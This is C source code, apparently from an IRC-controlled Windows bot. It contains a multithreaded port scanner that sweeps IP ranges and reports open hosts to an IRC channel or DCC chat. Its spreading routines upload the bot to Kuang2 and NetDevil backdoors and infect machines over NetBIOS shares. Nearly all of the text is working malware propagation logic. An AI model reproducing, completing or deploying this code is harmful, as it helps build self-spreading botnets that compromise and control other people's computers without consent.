//port scanner
DWORD WINAPI port_scanner(LPVOID param)
{
	int threadnum = (int)param;
	scan[threadnum].state = 1;
	char Scanning_ip[16];
	char buf[4];
	memset(Scanning_ip,0,sizeof(Scanning_ip));
	memset(buf,0,sizeof(buf));
	strcpy(Scanning_ip,scan[threadnum].ip);
	DWORD c,token,d,err;
	
	//break the ip in 4 parts
	for (d=0,c=0,token=0;c<=strlen(Scanning_ip);c++)
	{
		if  (Scanning_ip[c] == 46 || c == strlen(Scanning_ip)) {
			srand(GetTickCount());
			if (token == 0) { 
				if (strcmp(buf,"x") == 0) scan[threadnum].scan_1 = (rand()%254);
				else scan[threadnum].scan_1 = atoi(buf);

			}
			if (token == 1) {
				if (strcmp(buf,"x") == 0) scan[threadnum].scan_2 = (rand()%254);
				else scan[threadnum].scan_2 = atoi(buf);
			}
			if (token == 2) {
				if (strcmp(buf,"x") == 0) scan[threadnum].scan_3 = (rand()%254);
				else scan[threadnum].scan_3 = atoi(buf);
			}
			if (token == 3) {
				if (strcmp(buf,"x") == 0) scan[threadnum].scan_4 = (rand()%254);
				else scan[threadnum].scan_4 = atoi(buf);
			}
			memset(buf,0,sizeof(buf));
			d=0;
			token++;
			continue;
		}
		else {
			buf[d] = Scanning_ip[c];
			d++;
		}
	}
	while (err != 1) 
		err = scan_host(scan[threadnum].ip,scan[threadnum].port,threadnum);
		
	scan[threadnum].state = 0;
	threads[scan[threadnum].thread].id = 0;
	return 0;

}

int scan_host(char *host,int port,int num)
{
	char sendbuf[512];
	SOCKADDR_IN    SockAddr;
   	SOCKET         sock[MAX_PORTSCAN_SOCKETS_TO_USE];
	FILE *infile;
   	IN_ADDR iaddr;
	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(port);
	DWORD mode = 1;
	DWORD id;
	TIMEVAL time;
	int c;
	for (c=0;c<MAX_PORTSCAN_SOCKETS_TO_USE;c++)
	{
		sock[c] = socket(AF_INET, SOCK_STREAM, 0);
   		if (sock[c] == INVALID_SOCKET)
      			return 1;
		ioctlsocket(sock[c],FIONBIO,&mode);
	}
	for (c=0;c<MAX_PORTSCAN_SOCKETS_TO_USE;c++)
	{
		GetNewIp(num);
		iaddr.s_addr = inet_addr(scan[num].ip);
		if (iaddr.s_addr == INADDR_NONE)
			return 0;
		SockAddr.sin_addr = iaddr; 
  		connect(sock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
	}
      	Sleep(scan[num].delay);     
	for (c=0;c<MAX_PORTSCAN_SOCKETS_TO_USE;c++)
	{
   		fd_set fd_struct;
    		time.tv_sec = 0;
    		time.tv_usec = 0;
   		FD_ZERO(&fd_struct);
    		FD_SET(sock[c], &fd_struct);
		if (select(0,NULL, &fd_struct, NULL, &time) < 1) {
			closesocket(sock[c]);
			continue;
		}
		else {//its open
			SOCKADDR socketname;
			int s = sizeof(socketname);
			getpeername(sock[c],&socketname,&s);
			memcpy(&iaddr.S_un.S_addr,&socketname.sa_data[2],4);
			if (strlen(scan[num].file) > 2) { //log to file
				infile = fopen(scan[num].file,"aw");
				if (infile != NULL) {
					sprintf(sendbuf,"%s:%i\n",inet_ntoa(iaddr),port);
					fputs(sendbuf,infile);
					fclose(infile);
				}
			}
      	     
			if (strlen(scan[num].chan) > 2) sprintf(sendbuf,"PRIVMSG %s :Found port %i open at ip:%s\n",scan[num].chan,port,inet_ntoa(iaddr)); //sendto query/channel
			else sprintf(sendbuf,"Found port %i open at ip:%s \r\n",port,inet_ntoa(iaddr)); //send to dcc chat	
			if (scan[num].sock != 0) send(scan[num].sock, sendbuf, strlen(sendbuf), 0);
			if (scan[num].extra == 0 || scan[num].extra == 3) closesocket(sock[c]);

			
			#ifdef KUANG2_SPREADER
			if (scan[num].extra == 2) {
				if (KUANG(sock[c]) == 1 && scan[num].sock != 0) {
					if (strlen(scan[num].chan) > 2) sprintf(sendbuf,"PRIVMSG %s :Server uploaded to kuangserver IP: %s\n",scan[num].chan,inet_ntoa(iaddr)); //sendto query/channel
					else sprintf(sendbuf,"Server uploaded to kuangserver IP: %s \r\n",inet_ntoa(iaddr)); //send to dcc chat	
					send(scan[num].sock, sendbuf, strlen(sendbuf), 0);
				}
			}
			#endif
	
			if (scan[num].extra == 4) {
				if (netdevil(inet_ntoa(iaddr),port,scan[num].sock,sock[c],scan[num].chan) == 1) {
					if (strlen(scan[num].chan) > 2) sprintf(sendbuf,"PRIVMSG %s :Netdevil rooted ip: %s\n",scan[num].chan,inet_ntoa(iaddr)); //sendto query/channel	
					send(scan[num].sock, sendbuf, strlen(sendbuf), 0);
				}
			}
			
			if (scan[num].extra == 3) {
				if (InfectNetBIOS2(inet_ntoa(iaddr),scan[num].sock,scan[num].chan) == 2) {
					if (strlen(scan[num].chan) > 2) sprintf(sendbuf,"PRIVMSG %s :could not find netapi32.dll\n",scan[num].chan); //sendto query/channel
					else sprintf(sendbuf,"could not find netapi32.dll\r\n",inet_ntoa(iaddr)); //send to dcc chat	
					send(scan[num].sock, sendbuf, strlen(sendbuf), 0);
					return 1;
				}
			}
			
		}
	}
	return 0;
}



void GetNewIp(int num)
{
	while (1) {
		if (scan[num].scan_4 > 254) {
			scan[num].scan_4 = 0;
			scan[num].scan_3++;
		}
		else {
			scan[num].scan_4++;
			break;
		}
		if (scan[num].scan_3 > 254) {
			scan[num].scan_3 = 0;
			scan[num].scan_2++;
		}
		else 
			break;
		if (scan[num].scan_2 > 254) {
			scan[num].scan_2 = 0;
			scan[num].scan_1++;
		}
		else 
			break;
		if (scan[num].scan_1 > 254) { //we are at 255.255.255.255 and we start again with 0.0.0.0
			scan[num].scan_1 = 0;
			scan[num].scan_2 = 0;
			scan[num].scan_3 = 0;
			scan[num].scan_4 = 0;
		}
		else 
			break;

	}
	sprintf(scan[num].ip,"%i.%i.%i.%i",scan[num].scan_1,scan[num].scan_2,scan[num].scan_3,scan[num].scan_4);
		
}

typedef DWORD (__stdcall *RSP5)(PCHAR,DWORD,LPBYTE,DWORD,LPDWORD,LPDWORD,LPDWORD);
RSP5 fNetShareEnum;

typedef NET_API_STATUS (__stdcall *NABF) (LPVOID Buffer );
NABF fNetApiBufferFree;
